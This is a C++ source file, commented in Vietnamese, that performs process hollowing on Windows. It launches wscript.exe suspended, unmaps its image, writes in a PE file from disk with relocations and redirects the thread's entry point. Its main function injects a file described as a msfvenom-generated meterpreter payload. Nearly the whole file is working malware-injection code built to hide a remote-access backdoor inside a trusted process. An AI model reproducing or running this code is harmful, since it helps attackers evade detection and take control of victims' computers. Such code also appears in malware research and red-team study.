#include "stdafx.h"
#include <windows.h>
#include "internals.h"
#include "pe.h"

// Hàm chính thực hiện process hollowing
void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{
    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
    CreateProcessA(0, pDestCmdLine, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);

    if (!pProcessInfo->hProcess)
        return;

    PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

    HANDLE hFile = CreateFileA(pSourceFile, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);
    if (hFile == INVALID_HANDLE_VALUE)
        return;

    DWORD dwSize = GetFileSize(hFile, 0);
    PBYTE pBuffer = new BYTE[dwSize];
    DWORD dwBytesRead = 0;
    ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);
    CloseHandle(hFile);
    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
    PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
    DWORD dwResult = NtUnmapViewOfSection(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
    if (dwResult)
        return;

    PVOID pRemoteImage = VirtualAllocEx(
        pProcessInfo->hProcess,
        pPEB->ImageBaseAddress,
        pSourceHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!pRemoteImage)
        return;

    DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
    pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

    WriteProcessMemory(
        pProcessInfo->hProcess,
        pPEB->ImageBaseAddress,
        pBuffer,
        pSourceHeaders->OptionalHeader.SizeOfHeaders,
        0
    );

    for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
    {
        if (!pSourceImage->Sections[x].PointerToRawData)
            continue;

        PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
        WriteProcessMemory(
            pProcessInfo->hProcess,
            pSectionDestination,
            &pBuffer[pSourceImage->Sections[x].PointerToRawData],
            pSourceImage->Sections[x].SizeOfRawData,
            0
        );
    }

    // Thực hiện relocation nếu có delta
    if (dwDelta)
        for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
        {
            char* pSectionName = ".reloc";
            if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
                continue;

            DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
            DWORD dwOffset = 0;
            IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            while (dwOffset < relocData.Size)
            {
                PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
                dwOffset += sizeof(BASE_RELOCATION_BLOCK);
                DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

                for (DWORD y = 0; y < dwEntryCount; y++)
                {
                    dwOffset += sizeof(BASE_RELOCATION_ENTRY);
                    if (pBlocks[y].Type == 0)
                        continue;

                    DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
                    DWORD dwBuffer = 0;
                    ReadProcessMemory(
                        pProcessInfo->hProcess,
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
                        &dwBuffer,
                        sizeof(DWORD),
                        0
                    );
                    dwBuffer += dwDelta;
                    WriteProcessMemory(
                        pProcessInfo->hProcess,
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
                        &dwBuffer,
                        sizeof(DWORD),
                        0
                    );
                }
            }
            break;
        }

    DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;

    GetThreadContext(pProcessInfo->hThread, pContext);
    pContext->Eax = dwEntrypoint;
    SetThreadContext(pProcessInfo->hThread, pContext);
    ResumeThread(pProcessInfo->hThread);
}

// Thực hiện process hollowing 
int _tmain(int argc, _TCHAR* argv[])
{
    char* pPath = new char[MAX_PATH];
    GetModuleFileNameA(0, pPath, MAX_PATH);
    pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
    strcat(pPath, "fullx32.exe"); // meterpreter payload tạo từ msfvenom
    CreateHollowedProcess("C:\\Windows\\SysWOW64\\wscript.exe", pPath);
    system("pause");
    return 0;
}
